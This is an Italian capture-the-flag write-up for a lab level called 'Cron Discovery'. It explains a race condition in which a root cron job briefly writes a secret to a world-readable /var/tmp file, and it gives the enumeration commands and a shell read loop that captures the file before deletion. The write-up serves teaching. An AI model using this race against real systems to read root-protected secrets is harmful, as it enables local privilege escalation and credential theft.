```
 ========================================================================
   B R E A C H L A B   ::   F I E L D   N O T E S
 ------------------------------------------------------------------------
   ghost track · phile 0x14 · "cron discovery"
 ========================================================================

   target ..: ghost-20  "Cron Discovery"
   class ...: cron abuse · TOCTOU race condition
   tools ...: ls · cat · loop di lettura
   author ..: noflyfre
   status ..: owned
```

[← indice](../../README.md)

> qualcosa gira come root ogni minuto, scrive un segreto in un file
> world-readable e lo cancella dopo due secondi. quella finestra è tutto
> ciò che ti serve.

## ----[ 0x00 · intel ]----

Il livello dice che "qualcosa" viene eseguito periodicamente come root e
chiede di scoprire cosa, dove scrive e cosa legge, suggerendo di guardare
negli angoli di `/etc` dedicati ai job pianificati. Obiettivo:
identificare il cron root giusto, capirlo e usarlo per la credenziale del
livello dopo.

## ----[ 0x01 · recon ]----

`/etc/cron.d/` mostra, oltre ai job standard (`e2scrub_all`), due file non
standard con timestamp recente. Il contenuto combinato rivela due entry
che girano **ogni minuto** come root, verso due script in `/opt/`. Il
primo (`job.sh`) è il target: lo si legge per capire cosa fa.

## ----[ 0x02 · il difetto ]----

**Race condition su file temporaneo scritto da un cron root** (pattern
TOCTOU). Schema tipico:

1. Un job root copia un contenuto protetto (root-only) in un file
   temporaneo con permessi più larghi (es. `/var/tmp`, world-readable).
2. Aspetta un attimo prima di cancellarlo.
3. Cancella.

Il punto debole è la finestra tra scrittura e cancellazione: in
quell'istante qualunque utente locale con lettura sulla directory può
leggere un contenuto altrimenti inaccessibile. E siccome il job gira ogni
minuto, la finestra si ripresenta di continuo: niente timing
millimetrico, basta un loop di lettura stretto.

## ----[ 0x03 · exploit ]----

1. Enumerazione dei job pianificati:

```bash
ls -la /etc/cron.d/
```

Entry non standard con timestamp recente rispetto ai job di sistema.

2. Contenuto delle crontab, per capire cosa e con che frequenza:

```bash
cat /etc/cron.d/*
```

Job custom con cadenza `* * * * *` (ogni minuto) come root — condizione
ideale per una race.

3. Lettura dello script per il flusso dati:

```bash
cat /opt/ghost-cron/job.sh
```

```bash
#!/bin/bash
cat <REDACTED> > /var/tmp/ghost-cron-output 2>/dev/null
sleep 2
rm -f /var/tmp/ghost-cron-output
while true; do cat /var/tmp/ghost-cron-output 2>/dev/null && break; sleep 1; done
```

C'è una finestra in cui un file world-readable in `/var/tmp` contiene un
secret altrimenti inaccessibile, prima della cancellazione.

4. Sfruttando la periodicità (ogni minuto), basta leggere in loop il file
   temporaneo per catturarne il contenuto prima del `rm`.

## ----[ 0x04 · loot ]----

Sfruttata la finestra tra scrittura e cancellazione, si legge il secret
prima che sparisca: credenziale per il livello dopo (valore fuori dal
writeup). Lezione: un cron root che scrive in `/var/tmp` e "dorme" è un
TOCTOU servito su un piatto.

```
--[ eof ]---------------------------------------------------------------

  breachlab.org · ghost track
```
